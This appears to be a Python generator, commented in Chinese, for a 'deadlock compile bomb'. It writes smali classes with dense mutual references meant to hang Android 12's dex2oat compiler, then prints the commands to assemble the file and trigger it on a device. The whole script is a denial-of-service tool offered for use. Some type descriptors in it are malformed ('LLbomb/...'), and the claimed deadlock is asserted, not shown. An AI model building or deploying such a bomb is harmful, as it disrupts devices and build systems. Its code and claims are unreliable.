#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
dex2oat ResolveClassFieldsAndMethodsVisitor 死锁编译炸弹生成器

原理（Android 12 art/dex2oat/driver/compiler_driver.cc:1512-1629）：
  ResolveClassFieldsAndMethodsVisitor::Visit() 在线程池中并行执行。
  每个 worker 持有 mutator_lock_(SHARED via ScopedObjectAccess)，
  然后对类中每个方法调用 ResolveMethod → 解析返回/参数类型 →
  FindClass → LoadClass → 需要 classlinker_classes_lock_ 排他锁。
  当多个 worker 同时对交叉引用的类执行此操作时，
  classlinker_classes_lock_ 上的争抢 + 深层递归类加载形成活锁，
  主线程在 thread_pool_->Wait() 中无限等待，直至看门狗超时（9.5min）。

构造策略:
  - N 对类 (Ai, Bi)，共 2N 个类
  - Ai 的所有方法都引用 Bi 作为返回类型和参数类型
  - Bi 的所有方法都引用 Ai 作为返回类型和参数类型
  - 每类 30+ 方法，每个 Visit 耗时长 → 增加碰撞窗口
  - 再叠加接口引用链路 Ai→I→Bi, Bi→J→Ai → 增加 LoadClass 深度
  - 全部放在一个 dex 中（同一个 ResolveDexFile 调用分发给线程池）

用法:
  python gen_deadlock_bomb.py  # 生成 smali/ 目录
  # 然后用 smali.jar 或 d8 编译成 dex
  # java -jar smali.jar assemble smali/ -o deadlock_bomb.dex
  # dex2oat --dex-file=deadlock_bomb.dex --oat-file=out.oat --compiler-filter=speed -j8 --watchdog-timeout=600000
"""

import os

N_PAIRS = 80        # 80 对 = 160 个类
METHODS_PER = 30    # 每类方法数
OUT_DIR = "smali"
PACKAGE = "Lbomb"

os.makedirs(OUT_DIR, exist_ok=True)

# 关键：配对类必须在 class_def 表中相邻，这样线程池的 fetch_add 分发
# 才会让不同线程同时处理相互引用的 A_n 和 B_n。
# 命名用 `bomb_PP_{pair_idx}_A.smali` / `bomb_PP_{pair_idx}_B.smali`，
# 按字母序排列时，同一 pair_idx 的 A/B 紧邻。

NAMES = []
for pi in range(N_PAIRS):
    NAMES.append((f"bomb_PP_{pi:03d}_A", f"PairA{pi}", f"PairB{pi}", pi % 8))
    NAMES.append((f"bomb_PP_{pi:03d}_B", f"PairB{pi}", f"PairA{pi}", (pi + 1) % 8))
# NAMES = [(filename_prefix, self_class, paired_class, iface_idx), ...]
# 排序后：bomb_PP_000_A, bomb_PP_000_B, bomb_PP_001_A, bomb_PP_001_B, ...
NAMES.sort()  # 确保 A/B 对紧邻

# 辅助：生成方法签名——每方法有多个参数和返回类型，密集引用配对类
def gen_methods(class_idx, paired_class_name, other_pairs):
    """生成 METHODS_PER 个方法，参数/返回类型密集引用配对类和其他随机类。"""
    out = []
    for m in range(METHODS_PER):
        # 返回类型：在配对类和其他类之间交替
        if m % 4 == 0:
            ret = paired_class_name
        elif m % 4 == 1:
            # 随机另一个配对的目标类
            ri = (class_idx + m * 7 + 3) % N_PAIRS
            if ri % 2 == 0:
                ret = f"{PACKAGE}/PairB{ri // 2};"
            else:
                ret = f"{PACKAGE}/PairA{ri // 2};"
        elif m % 4 == 2:
            # 接口引用（增加 LoadClass 递归深度）
            ret = f"{PACKAGE}/I{m % 8};"
        else:
            ret = "I"  # int，偶尔简单类型

        # 参数列表：1-5 个参数，混合类型
        n_params = 1 + ((m * 3 + class_idx) % 5)
        params = []
        for p in range(n_params):
            ptype = m % 3
            if ptype == 0:
                params.append(paired_class_name)  # 主力：配对类
            elif ptype == 1:
                ri = (class_idx + p * 13 + m) % N_PAIRS
                if ri % 3 == 0:
                    params.append(f"{PACKAGE}/PairA{ri};")
                elif ri % 3 == 1:
                    params.append(f"{PACKAGE}/PairB{ri};")
                else:
                    params.append(f"{PACKAGE}/I{ri % 8};")
            else:
                params.append("I")  # int

        param_str = "".join(params)
        out.append(f".method public m{m}({param_str}){ret}")
        out.append(f"    .registers {n_params + 2}")
        if ret == "I":
            out.append("    const/4 v0, 0x0")
            out.append("    return v0")
        elif ret.startswith("["):
            out.append("    const/4 v0, 0x0")
            out.append("    new-array v0, v0, [Ljava/lang/Object;")
            out.append("    return-object v0")
        else:
            out.append("    const/4 v0, 0x0")
            out.append("    return-object v0")
        out.append(".end method")
        out.append("")
    return out

# 生成接口（增加类层级深度）
for i in range(8):
    smali = []
    smali.append(f".class public interface abstract {PACKAGE}/I{i};")
    smali.append(".super Ljava/lang/Object;")
    smali.append("")
    # 每个接口有少量方法，引用各种类型
    for m in range(3):
        ri = (i * 7 + m * 3) % N_PAIRS
        smali.append(f".method public abstract iface_m{m}_{i}()L{PACKAGE}/PairA{ri};")
        smali.append(".end method")
        smali.append("")
    path = os.path.join(OUT_DIR, f"bomb_I{i}.smali")
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(smali))

# 生成类对（interleaved 顺序：A0, B0, A1, B1, ...）
for fname, self_cls, paired_cls, iface_idx in NAMES:
    own = f"{PACKAGE}/{self_cls};"
    paired_class = f"{PACKAGE}/{paired_cls};"
    smali = []
    smali.append(f".class public {own}")
    smali.append(".super Ljava/lang/Object;")
    smali.append(f".implements {PACKAGE}/I{iface_idx};")
    smali.append("")

    # 静态字段 + <clinit> 制造内存压力
    smali.append(f".field static bigArray:[I")
    smali.append("")
    smali.append(".method static constructor <clinit>()V")
    smali.append("    .registers 2")
    smali.append("    const/16 v0, 0x400")
    smali.append("    new-array v0, v0, [I")
    smali.append(f"    sput-object v0, {own}->bigArray:[I")
    smali.append("    return-void")
    smali.append(".end method")
    smali.append("")

    # 实例字段：引用配对类 + 额外交叉引用增加复杂度
    smali.append(f".field public ref:L{paired_class}")
    smali.append(f".field public ref2:L{paired_class}")
    # 额外字段引用其他类，随机扩散
    ri = (hash(self_cls) * 3 + 5) % N_PAIRS
    extra = f"PairB{ri}" if "PairA" in self_cls else f"PairA{ri}"
    smali.append(f".field public cross:L{PACKAGE}/{extra};")
    smali.append("")

    # 构造函数
    smali.append(".method public constructor <init>()V")
    smali.append("    .registers 1")
    smali.append("    invoke-direct {p0}, Ljava/lang/Object;-><init>()V")
    smali.append("    return-void")
    smali.append(".end method")
    smali.append("")

    # 大量方法，密集引用配对类
    smali.extend(gen_methods(hash(self_cls) % 10000, paired_class, N_PAIRS))

    path = os.path.join(OUT_DIR, f"{fname}.smali")
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(smali))

# 删除旧的不按 interleave 排列的残留文件
import glob as _glob
_old = set(_glob.glob(os.path.join(OUT_DIR, "bomb_Pair*.smali")))
_kept = set(os.path.join(OUT_DIR, f"{n}.smali") for n, _, _, _ in NAMES)
for f in _old - _kept:
    os.remove(f)

# 统计
total_files = len(os.listdir(OUT_DIR))
total_methods = 2 * N_PAIRS * METHODS_PER + 2 * N_PAIRS * 2 + 8 * 3
total_fields = 2 * N_PAIRS * 3
print(f"生成了 {total_files} 个 smali 文件（{2*N_PAIRS} 个类 + 8 个接口）")
print(f"  每类 {METHODS_PER} 个交叉引用方法 + 构造 + <clinit>")
print(f"  总方法: ~{total_methods}")
print(f"  总字段: ~{total_fields}")
print(f"  交叉引用对: {N_PAIRS}")
print(f"  命名策略: interleaved（A_n 与 B_n 紧邻 → 线程池并行取到时碰撞）")
print()
print("编译命令（需要 smali.jar 或 d8）：")
print(f"  java -jar smali.jar assemble {OUT_DIR}/ -o deadlock_bomb.dex")
print()
print("触发命令（在 Android 12 设备上）：")
print("  dex2oat --dex-file=deadlock_bomb.dex --oat-file=/data/local/tmp/bomb.oat \\")
print("    --compiler-filter=speed -j8 --watchdog-timeout=600000")
print()
print("预期效果：")
print("  - 8 线程并行 ResolveClassFieldsAndMethodsVisitor")
print("  - 每个 Visit 调用 ~30 次 ResolveMethod + ~3 次 ResolveField")
print("  - 每次 ResolveMethod 都触发交叉类的 LoadClass")
print("  - classlinker_classes_lock_ 激烈争抢 + 递归类加载深度")
print("  - 主线程卡在 thread_pool_->Wait()")
print("  - 10 分钟内不返回 → 看门狗 Fatal exit(1)")
